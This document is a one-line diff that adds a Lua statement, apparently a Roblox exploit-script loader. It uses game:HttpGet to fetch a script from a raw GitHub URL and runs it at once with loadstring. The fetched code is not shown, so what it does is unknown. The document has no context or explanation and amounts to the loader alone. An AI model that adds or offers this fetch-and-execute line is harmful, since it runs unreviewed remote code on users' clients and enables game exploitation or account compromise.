@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/jk2/main/dsa"))()
